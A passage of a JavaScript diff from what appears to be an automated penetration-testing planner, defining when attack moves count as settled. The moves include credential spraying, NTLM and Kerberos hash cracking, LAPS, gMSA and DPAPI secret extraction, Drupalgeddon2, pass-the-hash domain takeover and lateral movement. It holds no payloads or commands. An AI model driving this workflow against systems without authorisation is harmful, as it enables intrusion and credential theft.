+      var fPrefixes = fMeta.cmdPrefixes;
+      var fWildcard = fMeta.cmdPrefixWildcard;
+      for (var fi = 0; fi < frameInfos.length; fi++) {
+        var info = frameInfos[fi];
+        if (info.actionId === action.id) return true;
+        if (fWildcard) return true;
+        if (!fPrefixes.length) continue;
+        var iHay = info.hay;
+        for (var fpi = 0; fpi < fPrefixes.length; fpi++) {
+          if (iHay.indexOf(fPrefixes[fpi]) >= 0) return true;
+        }
+      }
+      return false;
+    }
+    var eng = rc && rc.engagement;
+    if (!eng || !Array.isArray(eng.activities)) return true;
+    var acts = eng.activities;
+    if (!acts.length) return false;
+    var meta = v2GetActionMeta(action);
+    var prefixes = meta.cmdPrefixes;
+    var wildcard = meta.cmdPrefixWildcard;
+    for (var ai = 0; ai < acts.length; ai++) {
+      var act = acts[ai];
+      if (!act) continue;
+      var ao = act.outcome;
+      if (!ao) continue;
+      if (!ao.retireCommand && !(ao.kind === 'success' && /(?:^|\s)--host\b/i.test(act.command || ''))) continue;
+      if ((act.action_id || act.actionId) === action.id) return true;
+      if (wildcard) return true;
+      if (!prefixes.length) continue;
+      var hay = (String(act.command || '') + '\n' + String(act.dispatch || '') + '\n' + (Array.isArray(act.sequenceCommands) ? act.sequenceCommands.join('\n') : '')).toLowerCase();
+      for (var pi = 0; pi < prefixes.length; pi++) {
+        if (hay.indexOf(prefixes[pi]) >= 0) return true;
+      }
+    }
+    return false;
+  }
+
+  Action.prototype.settled = function (facts, preHave) {
+    if (!facts) return false;
+    var rMemo = !facts._checkingCredPool ? getResolvedFactsMemo(facts) : null;
+    var sigBase = 0;
+    if (rMemo) {
+      sigBase = v2GetActionMeta(this).cacheKey;
+      var cachedS = rMemo.settled.get(this);
+      if (cachedS === sigBase + 2) return true;
+      if (cachedS === sigBase + 1) return false;
+    }
+    var res = this._settledImpl(facts, rMemo ? rMemo.have : preHave);
+    if (rMemo) rMemo.settled.set(this, sigBase + (res ? 2 : 1));
+    return res;
+  };
+
+  Action.prototype._settledImpl = function (facts, preHave) {
+    var action = this;
+    var fastH = canUseFastHave(facts, preHave) ? preHave : null;
+    var allScoped = (facts._resolvedContext && Array.isArray(facts._resolvedContext.allScopedFacts))
+      ? facts._resolvedContext.allScopedFacts : null;
+    function valsOf(kind) {
+      if (allScoped) {
+        return allScoped.filter(function (f) { return f && f.state === 'supported' && f.kind === kind && f.value; }).map(function (f) { return f.value; });
+      }
+      return facts.values ? (facts.values(kind) || []) : [];
+    }
+    var applicable = null;
+    function getApplicable() {
+      if (applicable !== null) return applicable;
+      applicable = [];
+      if (facts._resolvedContext && actionBlockedByInvariantGate(action, facts, fastH)) return applicable;
+      (action.commands || []).forEach(function (cmd, index) {
+        var commandFacts = facts.forAction ? facts.forAction(action, cmd) : facts;
+        var portOk = !root.OBOL || !root.OBOL.command || !root.OBOL.command.commandPortFeasible
+          || root.OBOL.command.commandPortFeasible(cmd, commandFacts).feasible !== false;
+        if (portOk && action.eligible(commandFacts) && commandIsEligible(cmd, commandFacts, action)) {
+          applicable.push({ cmd: cmd, index: index });
+        }
+      });
+      return applicable;
+    }
+    var isGuidedSeq = isGuidedSequenceMove(this);
+    var allApplicableCompleted = false, someApplicableCompleted = false, someCleanCompleted = false, allRequiredSeqCleanCompleted = false;
+    var appList = [];
+    if (facts.context && facts.commandCompleted) {
+      if (this.id === 'validate-credential' || actionMayMatchCompletedActivity(action, facts)) {
+        appList = getApplicable();
+        var cleanFn = facts.commandCompletedClean || facts.commandCompleted;
+        someApplicableCompleted = appList.some(function (entry) { return facts.commandCompleted(action, entry.cmd, entry.index); });
+        if (someApplicableCompleted) {
+          someCleanCompleted = cleanFn === facts.commandCompleted ? true : appList.some(function (entry) { return cleanFn(action, entry.cmd, entry.index); });
+          allApplicableCompleted = appList.length > 0 && appList.every(function (entry) { return facts.commandCompleted(action, entry.cmd, entry.index); });
+          if (isGuidedSeq) {
+            var reqSeq = appList.filter(function (entry) { return !(entry.cmd && entry.cmd.alt); });
+            if (!reqSeq.length) reqSeq = appList;
+            allRequiredSeqCleanCompleted = reqSeq.length > 0 && reqSeq.every(function (entry) { return cleanFn(action, entry.cmd, entry.index); });
+          }
+        }
+      }
+    }
+    if (this.id === 'validate-credential' && facts.context) {
+      var vcTgt = facts.context.target || '';
+      var vcPorts = (root.OBOL && root.OBOL.command && root.OBOL.command.openPorts) ? root.OBOL.command.openPorts(facts, vcTgt) : [];
+      var isAlreadyAuth = facts.has('credential.validated') || facts.has('smb.authenticated')
+        || facts.has('winrm.authenticated') || facts.has('ldap.authenticated')
+        || facts.has('ssh.authenticated') || facts.has('rdp.authenticated') || facts.has('mssql.authenticated');
+      var isRejectedCred = (facts.has('blocker.logon_failure') || facts.has('blocker.account_disabled')
+        || facts.has('blocker.account_locked') || facts.has('blocker.password_expired')
+        || (Array.isArray(facts.facts) && facts.facts.some(function (f) {
+          return f && f.state === 'refuted' && f.kind === 'credential.validation' && (!vcTgt || !f.scope || f.scope === 'host:' + vcTgt);
+        }))) && !appList.some(function (entry) {
+          return entry.cmd && entry.cmd.variant === 'local_auth_fallback' && (!facts.commandCompleted || !facts.commandCompleted(action, entry.cmd, entry.index));
+        });
+      if (facts._checkingCredPool && isRejectedCred) {
+        return true;
+      }
+      function isSkippedPoolUser(u) {
+        var ub = String(u || '').trim().replace(/^.*\\/, '').split('@')[0].toLowerCase();
+        return !ub || /\$$/.test(ub) || /^(?:guest|defaultaccount|krbtgt|wdagutilityaccount)$/.test(ub);
+      }
+      if (isAlreadyAuth && vcPorts && vcPorts.length > 0) {
+        if (!facts._checkingCredPool && !facts.has('access.admin') && !facts.has('access.system') && !facts.has('access.root') && allScoped && root.OBOL && root.OBOL.context && root.OBOL.context.resolve) {
+          var vcFrame0 = facts._resolvedContext && facts._resolvedContext._frame;
+          if (vcFrame0 && vcFrame0._vcPoolAuthSettled !== undefined) return vcFrame0._vcPoolAuthSettled;
+          var vcEng0 = facts._resolvedContext && facts._resolvedContext.engagement;
+          var curCredId0 = facts.context.credentialId;
+          var seenCandIds0 = Object.create(null);
+          if (curCredId0) seenCandIds0[curCredId0] = 1;
+          for (var cfi0 = 0; cfi0 < allScoped.length; cfi0++) {
+            var cf0 = allScoped[cfi0];
+            if (!cf0 || cf0.state !== 'supported' || (cf0.kind !== 'credential.available' && cf0.kind !== 'credential.reuse_candidate') || !cf0.value || cf0.value.speculativeCrossDomainReuse || (!cf0.value.password && !cf0.value.nthash && !cf0.value.hash)) continue;
+            if (isSkippedPoolUser(cf0.value.user || cf0.value.username)) continue;
+            var candMat0 = (vcFrame0 && vcFrame0.materials && vcFrame0.materials.has(cf0))
+              ? vcFrame0.materials.get(cf0)
+              : (root.OBOL.context.material ? root.OBOL.context.material(cf0.value, cf0.scope) : null);
+            var candId0 = (candMat0 && candMat0.id) || cf0.value.credentialId;
+            if (!candId0 || seenCandIds0[candId0]) continue;
+            seenCandIds0[candId0] = 1;
+            var candResolved0 = root.OBOL.context.resolve({ engagement: vcEng0, target: vcTgt, credentialId: candId0, actionId: 'validate-credential', _frame: vcFrame0 });
+            if (candResolved0 && candResolved0.facts) {
+              candResolved0.facts._checkingCredPool = true;
+              var candSettled0 = action.settled(candResolved0.facts);
+              delete candResolved0.facts._checkingCredPool;
+              if (!candSettled0) {
+                if (vcFrame0) vcFrame0._vcPoolAuthSettled = false;
+                return false;
+              }
+            }
+          }
+          if (vcFrame0) vcFrame0._vcPoolAuthSettled = true;
+        }
+        return true;
+      }
+      if (!isRejectedCred && appList.length > 0 && !allApplicableCompleted) return false;
+      if (appList.length === 0 && (!vcPorts || vcPorts.length === 0)) return false;
+      if (!facts._checkingCredPool && (facts.context.selectionSource === 'cross-host-reuse' || isRejectedCred) && allScoped && root.OBOL && root.OBOL.context && root.OBOL.context.resolve) {
+        var vcFrame = facts._resolvedContext && facts._resolvedContext._frame;
+        if (vcFrame && vcFrame._vcPoolReuseSettled !== undefined) return vcFrame._vcPoolReuseSettled;
+        var vcEng = facts._resolvedContext && facts._resolvedContext.engagement;
+        var curCredId = facts.context.credentialId;
+        var seenCandIds = Object.create(null);
+        if (curCredId) seenCandIds[curCredId] = 1;
+        for (var cfi = 0; cfi < allScoped.length; cfi++) {
+          var cf = allScoped[cfi];
+          if (!cf || cf.state !== 'supported' || (cf.kind !== 'credential.available' && cf.kind !== 'credential.reuse_candidate') || !cf.value || cf.value.speculativeCrossDomainReuse || (!cf.value.password && !cf.value.nthash && !cf.value.hash)) continue;
+          if (isSkippedPoolUser(cf.value.user || cf.value.username)) continue;
+          var candMat = (vcFrame && vcFrame.materials && vcFrame.materials.has(cf))
+            ? vcFrame.materials.get(cf)
+            : (root.OBOL.context.material ? root.OBOL.context.material(cf.value, cf.scope) : null);
+          var candId = (candMat && candMat.id) || cf.value.credentialId;
+          if (!candId || seenCandIds[candId]) continue;
+          seenCandIds[candId] = 1;
+          var candResolved = root.OBOL.context.resolve({ engagement: vcEng, target: vcTgt, credentialId: candId, actionId: 'validate-credential', _frame: vcFrame });
+          if (candResolved && candResolved.facts) {
+            candResolved.facts._checkingCredPool = true;
+            var candSettled = action.settled(candResolved.facts);
+            delete candResolved.facts._checkingCredPool;
+            if (!candSettled) {
+              if (vcFrame) vcFrame._vcPoolReuseSettled = false;
+              return false;
+            }
+          }
+        }
+        if (vcFrame) vcFrame._vcPoolReuseSettled = true;
+      }
+      return true;
+    }
+    if (this.id === 'content-discovery' && root.OBOL && root.OBOL.command && root.OBOL.command.webOrigins) {
+      var cdTgt = (facts.context && facts.context.target) || '';
+      var cdEng = facts._resolvedContext && facts._resolvedContext.engagement;
+      var woInfo = root.OBOL.command.webOrigins(facts, { target: cdTgt, engagement: cdEng });
+      if (woInfo && woInfo.all && woInfo.all.length > 0) {
+        return woInfo.unmapped.length === 0;
+      }
+    }
+    if (this.id === 'drupalgeddon2') return !!(facts.has('foothold.linux') || (facts.has('foothold.windows') && !facts.has('vuln.drupalgeddon2')));
+    var isRepeatablePerCredOrSession = this.id === 'crack-ntlm' || this.id === 'crack-modular-hash' || this.id === 'gmsa-read' || this.id === 'mysql-loot' || this.id === 'cert-authenticate' || this.id === 'postgres-login' || this.id === 'mssql-login' || this.id === 'ssh-key-login' || this.id === 'linux-remote-exec' || this.id === 'own-domain-pth' || this.id === 'win-interactive-shell' || this.id === 'lateral-exec';
+    if (allApplicableCompleted && !isRepeatablePerCredOrSession) return true;
+
+    if (this.id === 'gpp-passwords' && facts.values) {
+      var gppDone = valsOf('credential.plaintext').some(function (v) { return v && v.kind === 'gpp_plaintext'; })
+        || valsOf('credential.available').some(function (v) { return v && (v.kind === 'gpp_plaintext' || v.method === 'gpp-decrypt' || v.via === 'gpp_password'); })
+        || valsOf('credential.candidate').some(function (v) { return v && v.via === 'gpp_password' && v.password; });
+      return !!gppDone;
+    }
+    if (this.id === 'laps-read' && facts.values) {
+      var lapsDone = valsOf('ad.laps').some(function (v) { return v && (v.password || v.secret); })
+        || valsOf('credential.available').concat(valsOf('credential.plaintext')).concat(valsOf('credential.candidate')).some(function (v) {
+          return v && (/^laps/i.test(String(v.kind || '')) || v.via === 'laps' || v.method === 'laps');
+        });
+      return !!lapsDone;
+    }
+    if (this.id === 'gmsa-read' && facts.values) {
+      var gmsaDone = valsOf('credential.available').concat(valsOf('credential.ntlm_hash')).concat(valsOf('credential.candidate')).some(function (v) {
+        return v && (v.nthash || v.hash || v.password) && (v.user || v.username) && (v.method === 'gmsa' || v.via === 'gmsa' || /^gmsa/i.test(String(v.kind || '')));
+      });
+      return !!gmsaDone;
+    }
+    if (this.id === 'dpapi-secrets' && facts.values) {
+      var dpapiDone = valsOf('credential.available').concat(valsOf('credential.plaintext')).concat(valsOf('credential.candidate')).some(function (v) {
+        return v && (/^dpapi/i.test(String(v.kind || '')) || v.method === 'dpapi' || v.via === 'dpapi');
+      });
+      return !!dpapiDone;
+    }
+    var sMeta = v2GetActionMeta(this);
+    // Cracking actions (crack-tgs, crack-asrep, crack-ntlm, etc.) require specific hash evidence.
+    // Once a matching hash is cracked (or terminal escalation is held), the crack move is settled
+    // even if alternative cracking tools (john vs hashcat --show) were not run.
+    if (sMeta.isCrackMove) {
+      var reqHashes = sMeta.reqHashes;
+      if (reqHashes.length > 0 && facts.has) {
+        var fastH = canUseFastHave(facts, preHave) ? preHave : null;
+        var hasHash = false;
+        for (var rhi = 0; rhi < reqHashes.length; rhi++) {
+          if (fastH ? fastH[reqHashes[rhi]] : facts.has(reqHashes[rhi])) { hasHash = true; break; }
+        }
+        if (hasHash) {
+          var hasTgs = sMeta.reqHasTgs;
+          var hasAsrep = sMeta.reqHasAsrep;
+          var isModularHashMove = this.id === 'crack-modular-hash';
+          var isNtlmCrackMove = this.id === 'crack-ntlm';
+          var creds = valsOf('credential.available').concat(valsOf('credential.plaintext'));
+          var cracked = creds.some(function (c) {
+            if (!c) return false;
+            var meth = (c.method || '').toLowerCase();
+            var isCrack = meth.indexOf('crack') >= 0 || meth.indexOf('hashcat') >= 0 || meth.indexOf('john') >= 0;
+            if (!isCrack) return false;
+            var ht = String(c.hash_type || '').toLowerCase();
+            if (hasTgs && ht && ht !== 'tgs' && ht !== 'krb5tgs') return false;
+            if (hasAsrep && ht && ht !== 'asrep' && ht !== 'krb5asrep') return false;
+            if (isNtlmCrackMove && ht && ht !== 'ntlm') return false;
+            if (isModularHashMove && (!ht || ht === 'tgs' || ht === 'krb5tgs' || ht === 'asrep' || ht === 'krb5asrep' || ht === 'ntlm')) return false;
+            return true;
+          });
+          var mootByEscalation = isModularHashMove
+            ? (fastH ? !!fastH['loot.ntds'] : facts.has('loot.ntds'))
+            : (this.id === 'crack-ntlm'
+              ? false
+              : (fastH
+                ? !!(fastH['access.admin'] || fastH['access.system'] || fastH['access.root'] || fastH['loot.ntds'])
+                : (facts.has('access.admin') || facts.has('access.system') || facts.has('access.root') || facts.has('loot.ntds'))));
+          if (hasAsrep && !hasTgs) {
+            return mootByEscalation || !hasUncrackedAsrep(facts);
+          }
+          if (isNtlmCrackMove && cracked && !mootByEscalation) { var ntlmUsers = {}; valsOf('hash.ntlm').forEach(function (hv) { if (!hv) return; if (hv.user && !/^(?:guest|defaultaccount|wdagutilityaccount|krbtgt)$/i.test(hv.user) && !/\$$/.test(hv.user)) ntlmUsers[hv.user.toLowerCase()] = 1; (hv.entries || []).forEach(function (e) { if (e && e.user && !/^(?:guest|defaultaccount|wdagutilityaccount|krbtgt)$/i.test(e.user) && !/\$$/.test(e.user)) ntlmUsers[e.user.toLowerCase()] = 1; }); }); var crackedNtlmUsers = {}; creds.forEach(function (c) { var mth = String((c && c.method) || '').toLowerCase(), cht = String((c && c.hash_type) || '').toLowerCase(); if (c && c.user && (mth.indexOf('crack') >= 0 || mth.indexOf('hashcat') >= 0 || mth.indexOf('john') >= 0) && (!cht || cht === 'ntlm' || cht === 'hashcat')) crackedNtlmUsers[c.user.toLowerCase()] = 1; }); if (Object.keys(ntlmUsers).length >= 2 && Object.keys(crackedNtlmUsers).length < 2) return false; }
+          if (isModularHashMove && cracked && !mootByEscalation && Array.isArray(allScoped)) { var lastCrackableIdx = -1, lastModCrackIdx = -1; for (var mhi = 0; mhi < allScoped.length; mhi++) { var mhf = allScoped[mhi]; if (!mhf || mhf.state !== 'supported') continue; if (mhf.kind === 'hash.crackable') lastCrackableIdx = mhi; else if (mhf.kind === 'credential.available' || mhf.kind === 'credential.plaintext') { var mhv = mhf.value || {}, mhm = String(mhv.method || '').toLowerCase(), mht = String(mhv.hash_type || '').toLowerCase(); if ((mhm.indexOf('crack') >= 0 || mhm.indexOf('hashcat') >= 0 || mhm.indexOf('john') >= 0) && mht && mht !== 'tgs' && mht !== 'krb5tgs' && mht !== 'asrep' && mht !== 'krb5asrep' && mht !== 'ntlm') lastModCrackIdx = mhi; } } if (lastCrackableIdx > lastModCrackIdx) return false; }
+          if (cracked || mootByEscalation) return true;
+          return false;
+        }
+      }
+    }
+    var have = canUseFastHave(facts, preHave) ? preHave : augmentProjectedKinds(facts, facts.kinds());
+    if (this.id === 'bloodhound-collect') {
+      var bhEng = facts._resolvedContext && facts._resolvedContext.engagement;
+      var bhLive = !!(bhEng && Array.isArray(bhEng.activities) && bhEng.activities.length > 0);
+      if (have['ad.attack_paths'] || (have['ad.graph.collected'] && (!bhLive || someCleanCompleted))) return true;
+      if (bhLive && !someCleanCompleted) return false;
+    }
+    if (facts.context && !sMeta.isObjectiveFlagOnly) {
+      var eng = facts._resolvedContext && facts._resolvedContext.engagement;
+      var tgtIp = facts.context.target || '';
+      if (eng && Array.isArray(eng.activities)) {
+        var latestAct = null, latestAt = -Infinity, newestFirst = !(eng.activities.length >= 2 && Number(eng.activities[0] && eng.activities[0].at) < Number(eng.activities[eng.activities.length - 1] && eng.activities[eng.activities.length - 1].at));
+        for (var mai = newestFirst ? 0 : eng.activities.length - 1; newestFirst ? (mai < eng.activities.length) : (mai >= 0); newestFirst ? mai++ : mai--) {
+          var mAct = eng.activities[mai];
+          if (mAct && (mAct.action_id || mAct.actionId) === action.id && (!tgtIp || !mAct.target || mAct.target === tgtIp)) {
+            if (typeof mAct.at === 'number') {
+              if (newestFirst ? (mAct.at > latestAt) : (mAct.at >= latestAt)) { latestAt = mAct.at; latestAct = mAct; }
+            } else {
+              latestAct = mAct;
+              break;
+            }
+          }
+        }
+        if (latestAct) {
+          if (latestAct.outcome && latestAct.outcome.kind === 'partial') return false;
+          if ((this.commands || []).length === 1 && !someApplicableCompleted) return false;
+        }
+      }
+    }
+    // True once every produced kind is already proven - re-running gains no new facts.
+    var rawPk = this.produces || [];
+    if (!rawPk.length) return false;
+    var pk = sMeta.settledPk;
+    if (!sMeta.hasPrimaryPk && facts.commandCompleted) {
+      if (isGuidedSeq ? allRequiredSeqCleanCompleted : someCleanCompleted) return true;
+    }
+    if (this.id === 'ad-path-manual' && ((have['ad.attack_paths'] && have['ad.acl_lead']) || have['ad.control_paths'])) return true;
+    if (this.id === 'bloodyad-acl' || this.id === 'ad-acl-abuse') {
+      if (have['ad.domain_control'] || have['hash.krbtgt'] || have['loot.ntds'] || allApplicableCompleted) return true;
+      var aclEng = facts._resolvedContext && facts._resolvedContext.engagement;
+      if (aclEng && Array.isArray(aclEng.activities) && aclEng.activities.length > 0) return false;
+      return Boolean(have['ad.control_paths']);
+    }
+    if ((this.id === 'linux-enum' || this.id === 'windows-enum') && !have['objective.root_flag']) {
+      var hasLiveEnumEng = !!(facts && facts.context && facts._resolvedContext && facts._resolvedContext.engagement);
+      if (hasLiveEnumEng && !someApplicableCompleted && !have['access.admin'] && !have['access.system'] && !have['access.root']) return false;
+      var enumFhKind = this.id === 'linux-enum' ? 'foothold.linux' : 'foothold.windows';
+      var enumFactList = allScoped || (facts.facts || []);
+      var lastLeadsIdx = -1;
+      var allFhUsers = Object.create(null), allFhCount = 0;
+      for (var efi = 0; efi < enumFactList.length; efi++) {
+        var ef = enumFactList[efi];
+        if (!ef || (ef.state && ef.state !== 'supported')) continue;
+        if (ef.kind === 'privesc.leads') lastLeadsIdx = efi;
+        else if (ef.kind === enumFhKind && ef.value) {
+          var rawFhU = String(ef.value.user || ef.value.identity || ef.value.username || '').replace(/^.*[\\/]/, '').split('@')[0].trim().toLowerCase();
+          if (rawFhU && !/^(?:root|administrator|system|nt authority\\system)$/.test(rawFhU) && !allFhUsers[rawFhU]) {
+            allFhUsers[rawFhU] = 1;
+            allFhCount++;
+          }
+        }
+      }
+      if (allFhCount >= 1 && lastLeadsIdx >= 0) {
+        var beforeLeadsUsers = Object.create(null);
+        for (var bfi = 0; bfi <= lastLeadsIdx; bfi++) {
+          var bf = enumFactList[bfi];
+          if (!bf || (bf.state && bf.state !== 'supported') || bf.kind !== enumFhKind || !bf.value) continue;
+          var bFhU = String(bf.value.user || bf.value.identity || bf.value.username || '').replace(/^.*[\\/]/, '').split('@')[0].trim().toLowerCase();
+          if (bFhU) beforeLeadsUsers[bFhU] = 1;
+        }
+        for (var afi = lastLeadsIdx + 1; afi < enumFactList.length; afi++) {
+          var af = enumFactList[afi];
+          if (!af || (af.state && af.state !== 'supported') || af.kind !== enumFhKind || !af.value) continue;
+          var aFhU = String(af.value.user || af.value.identity || af.value.username || '').replace(/^.*[\\/]/, '').split('@')[0].trim().toLowerCase();
+          if (aFhU && !/^(?:root|administrator|system|nt authority\\system)$/.test(aFhU) && !beforeLeadsUsers[aFhU]) {
+            return false;
+          }
+        }
+      }
+      if (someApplicableCompleted && (have['privesc.leads'] || have['scan.local.interfaces'] || have['host.local_enum'])) return true;
+    }
+    var latestWasDry = !!(latestAct && latestAct.outcome && latestAct.outcome.kind === 'completed-negative');
+    if (facts.context && !have['objective.root_flag'] && !latestWasDry) {
+      var seqFacts = allScoped || (facts.facts || []);
+      if (this.id === 'cert-authenticate') {
+        var lastCertIdx = -1, lastCertAuthIdx = -1;
+        for (var ci0 = 0; ci0 < seqFacts.length; ci0++) {
+          var cfItem = seqFacts[ci0];
+          if (!cfItem || (cfItem.state && cfItem.state !== 'supported')) continue;
+          if (cfItem.kind === 'credential.certificate') lastCertIdx = ci0;
+          var cfVal = cfItem.value || {};
+          if (cfItem.source === 'cert-authenticate' || cfItem.kind === 'kerberos.tickets' || (cfItem.kind === 'hash.ntlm' && /certipy|pkinit|pfx/i.test(String(cfVal.via || cfVal.method || cfVal.tool || '')))) {
+            lastCertAuthIdx = ci0;
+          }
+        }
+        if (lastCertIdx >= 0 && lastCertIdx > lastCertAuthIdx) return false;
+      } else if (this.id === 'postgres-login') {
+        var lastPgSessIdx = -1, hasPgLootAfter = false;
+        for (var pgi = 0; pgi < seqFacts.length; pgi++) {
+          var pgf = seqFacts[pgi];
+          if (!pgf || (pgf.state && pgf.state !== 'supported')) continue;
+          if (pgf.kind === 'db.session' && lastPgSessIdx < 0) lastPgSessIdx = pgi;
+          if (lastPgSessIdx >= 0 && pgi > lastPgSessIdx && (pgf.kind === 'db.creds' || pgf.kind === 'hash.crackable' || pgf.kind === 'loot.material')) {
+            hasPgLootAfter = true;
+          }
+        }
+        if (!hasPgLootAfter) return false;
+      } else if (this.id === 'mssql-login') {
+        var lastMssqlIdx = -1, lastMsCredIdx = -1;
+        for (var msi = 0; msi < seqFacts.length; msi++) {
+          var msf = seqFacts[msi];
+          if (!msf || (msf.state && msf.state !== 'supported')) continue;
+          if (msf.kind === 'db.session' || msf.kind === 'mssql.authenticated') lastMssqlIdx = msi;
+          else if (msf.kind === 'credential.available' || msf.kind === 'credential.plaintext' || msf.kind === 'hash.ntlm') lastMsCredIdx = msi;
+        }
+        if (lastMsCredIdx > lastMssqlIdx) return false;
+      } else if (this.id === 'container-escape' && !allApplicableCompleted) {
+        return false;
+      } else if (this.id === 'ssh-key-login' || this.id === 'linux-remote-exec') {
+        var lastSshFootIdx = -1, lastSshKeyIdx = -1, lastLinuxCredIdx = -1;
+        for (var ssi = 0; ssi < seqFacts.length; ssi++) {
+          var ssf = seqFacts[ssi];
+          if (!ssf || (ssf.state && ssf.state !== 'supported')) continue;
+          var ssv = ssf.value || {};
+          if ((ssf.kind === 'ssh.authenticated' && (this.id === 'ssh-key-login' || facts.has('foothold.linux') || facts.has('access.shell'))) || ((ssf.kind === 'foothold.linux' || ssf.kind === 'access.shell') && /^(?:ssh|sshpass)$/i.test(String(ssv.tool || ssv.via || ssv.service || '')))) {
+            lastSshFootIdx = ssi;
+          } else if (ssf.kind === 'loot.ssh_key' || ssf.kind === 'credential.ssh_key') {
+            lastSshKeyIdx = ssi;
+            lastLinuxCredIdx = ssi;
+          } else if (ssf.kind === 'credential.available' || ssf.kind === 'credential.plaintext' || ssf.kind === 'credential.password') {
+            lastLinuxCredIdx = ssi;
+          }
+        }
+        if (this.id === 'ssh-key-login' && ((!someCleanCompleted && lastSshFootIdx < 0) || lastSshKeyIdx > lastSshFootIdx)) return false;
+        if (this.id === 'linux-remote-exec' && ((!someCleanCompleted && lastSshFootIdx < 0) || lastLinuxCredIdx > lastSshFootIdx)) return false;
+      } else if (this.id === 'own-domain-pth') {
+        var lastNtdsIdx = -1, lastDaShellIdx = -1;
+        for (var odi = 0; odi < seqFacts.length; odi++) {
+          var odf = seqFacts[odi];
+          if (!odf || (odf.state && odf.state !== 'supported')) continue;
+          if (odf.kind === 'loot.ntds') lastNtdsIdx = odi;
+          else if (odf.kind === 'access.system' || ((odf.kind === 'foothold.windows' || odf.kind === 'access.desktop') && /^administrator$/i.test(String((odf.value && (odf.value.user || odf.value.username || odf.value.identity)) || '').replace(/^.*[\\/]/, '').split('@')[0].trim()))) {
+            lastDaShellIdx = odi;
+          }
+        }
+        if (lastDaShellIdx < 0 || (lastNtdsIdx >= 0 && lastDaShellIdx <= lastNtdsIdx)) return false;
+      } else if (this.id === 'win-interactive-shell' || this.id === 'lateral-exec') {
+        if (!someCleanCompleted && this.id === 'win-interactive-shell' && !have['access.desktop']) return false;
+        var winFootUsers = Object.create(null), lastWinFootIdx = -1;
+        for (var wfi = 0; wfi < seqFacts.length; wfi++) {
+          var wff = seqFacts[wfi];
+          if (!wff || (wff.state && wff.state !== 'supported')) continue;
+          if (wff.kind === 'foothold.windows' || wff.kind === 'access.desktop') {
+            lastWinFootIdx = wfi;
+            var wfVal = wff.value || {};
+            var wfU = String(wfVal.user || wfVal.username || wfVal.identity || '').replace(/^.*[\\/]/, '').split('@')[0].trim().toLowerCase();
+            if (wfU) winFootUsers[wfU] = 1;
+          }
+        }
+        for (var wci = lastWinFootIdx + 1; wci < seqFacts.length; wci++) {
+          var wcf = seqFacts[wci];
+          if (!wcf || (wcf.state && wcf.state !== 'supported')) continue;
+          if (wcf.kind === 'credential.available' || wcf.kind === 'credential.plaintext' || wcf.kind === 'credential.password' || wcf.kind === 'hash.ntlm' || wcf.kind === 'winrm.authenticated' || wcf.kind === 'credential.certificate' || wcf.kind === 'kerberos.tickets') {
+            var wcVal = wcf.value || {};
+            var wcU = String(wcVal.user || wcVal.username || wcVal.principal || '').replace(/^.*[\\/]/, '').split('@')[0].trim().toLowerCase();
+            if ((wcU && !/\$$/.test(wcU) && !/^(?:guest|krbtgt|defaultaccount|wdagutilityaccount)$/.test(wcU) && !winFootUsers[wcU]) || (!wcU && (wcf.kind === 'credential.certificate' || wcf.kind === 'kerberos.tickets'))) {
+              return false;
+            }
+          }
+        }
+      }
+    }
+    if (allApplicableCompleted) return true;
+    // Moves whose primary outputs are ONLY generic multi-instance kinds (credential.available,
+    // credential.plaintext, credential.candidate, loot.files, config.review) must not settle merely
+    // because an unrelated credential/loot fact exists from an earlier step.
+    if (sMeta.onlyGenericCred || (sMeta.onlyGenericMulti && (facts.context || typeof facts.applicableCommands === 'function' || typeof facts.commandCompleted === 'function'))) {
+      if (someCleanCompleted && action.id !== 'keepass-dump-recover') return true;
+      var anyGenericHeld = false;
+      for (var gi0 = 0; gi0 < pk.length; gi0++) { if (have[pk[gi0]]) { anyGenericHeld = true; break; } }
+      if (!anyGenericHeld) return false;
+      var rawFactList = allScoped || (facts.facts || []);
+      var hasMoveSpecificFact = false;
+      for (var rfi = 0; rfi < rawFactList.length; rfi++) {
+        var f = rawFactList[rfi];
+        if (!f || f.state !== 'supported') continue;
+        if (f.source === action.id) { hasMoveSpecificFact = true; break; }
+        var v = f.value || {};
+        if (v.action_id === action.id || v.via === action.id || v.method === action.id) { hasMoveSpecificFact = true; break; }
+        if (action.id === 'password-spray' && /spray/i.test(String(v.method || v.via || ''))) { hasMoveSpecificFact = true; break; }
+        if (action.id === 'keepass-dump-recover' && (f.kind === 'credential.available' || f.kind === 'credential.plaintext' || f.kind === 'credential.password') && /keepass/i.test(String(v.method || v.via || v.kind || f.source || ''))) { hasMoveSpecificFact = true; break; }
+        if (action.id === 'sccm-exploit' && /sccm/i.test(String(v.method || v.via || v.kind || ''))) { hasMoveSpecificFact = true; break; }
+        if (action.id === 'vnc-decrypt' && /vnc/i.test(String(v.method || v.via || v.kind || ''))) { hasMoveSpecificFact = true; break; }
+        if (action.id === 'cisco-decrypt' && /cisco/i.test(String(v.method || v.via || v.kind || ''))) { hasMoveSpecificFact = true; break; }
+      }
+      if (!hasMoveSpecificFact) return false;
+    }
+    var allHeld = true;
+    for (var i = 0; i < pk.length; i++) { if (!have[pk[i]]) { allHeld = false; break; } }
+    if (allHeld) return true;
+    // Multi-OS / multi-foothold moves (e.g. produces both foothold.linux and foothold.windows)
+    // cannot prove both OS footholds on a single host. Treat an OS-foothold output as satisfied
+    // once any full OS foothold (foothold.linux or foothold.windows) is held, a webshell/shell
+    // output as satisfied once that shell or a full OS foothold is held, and an admin/system/root
+    // output as satisfied once any admin/system/root fact is held.
+    var hasOsFoot = !!(have['foothold.linux'] || have['foothold.windows']);
+    var hasAdmin = !!(have['access.admin'] || have['access.system'] || have['access.root']);
+    var reqHasFoot = sMeta.reqHasFoot;
+    var reqHasAdmin = sMeta.reqHasAdmin;
+    for (var j = 0; j < pk.length; j++) {
+      var k = pk[j];
+      if (have[k]) continue;
+      if ((k === 'foothold.linux' || k === 'foothold.windows') && hasOsFoot && !reqHasFoot) continue;
+      if (k === 'foothold.webshell' && hasOsFoot) continue;
+      if (k === 'access.shell' && hasOsFoot && !reqHasFoot) continue;
+      var needsDistinctSystem = k === 'access.system' && !have['access.system'] && !have['access.root'] && reqHasFoot && pk.indexOf('access.admin') < 0
+        && !!(have['privesc.windows_privilege'] || have['privesc.seimpersonate'] || have['privesc.se_impersonate']);
+      if ((k === 'access.admin' || k === 'access.system' || k === 'access.root') && hasAdmin && !reqHasAdmin && !needsDistinctSystem) continue;
+      if (this.id === 'file-upload' && k === 'foothold.webshell' && have['web.upload_confirmed']) continue;
